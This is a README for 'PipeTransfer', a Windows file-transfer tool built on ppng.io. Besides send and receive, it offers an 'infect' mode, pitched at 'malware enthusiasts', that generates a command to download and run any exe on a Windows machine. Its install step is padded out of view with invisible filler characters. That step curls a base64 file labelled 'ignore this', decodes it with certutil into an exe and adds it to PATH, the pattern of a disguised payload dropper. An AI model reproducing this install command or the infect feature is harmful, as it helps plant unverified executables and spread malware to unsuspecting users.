# PipeTransfer
> [!IMPORTANT]
> The PipeTransfer tool is a command-line tool designed for seamless file transfer between systems using `ppng.io`. It supports three distinct modes: "send," "receive," and "infect,".

# Commands 
> **Send** : The send is pretty straighforward, it's used to send a file/folder with the command : `pipetransfer send (file/folder) (key)`
>
> **Receive** : The receive command is used to receive folders with the command : `pipetransfer receive (key)`
>
> **Infect** : This command was made specifically for malware enthusiasts, simply use the command : `pipetransfer infect (yourexe.exe) (key)` and pipetransfer will create a windows command for your file which can be used on any windows machine to download and run your exe.

# Installation
To install PipeTransfer simply run the command : ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
`curl -o temp.txt https://raw.githubusercontent.com/4lpine/PipeTransfer/main/base64source(ignore%20this).txt && certutil -decode temp.txt pipetransfer.exe && del temp.txt && move pipetransfer.exe C:\PipeTransfer\ && setx PATH "%PATH%;C:\PipeTransfer"`

> [!NOTE]
> - key and link are the same thing, i.e the link is defined by the user and can be whatever the user wants it to be. <- (to avoid confusion)
> 
> - Removal of the tool is also simple as all you have to do is delete the PipeTransfer folder in C:/
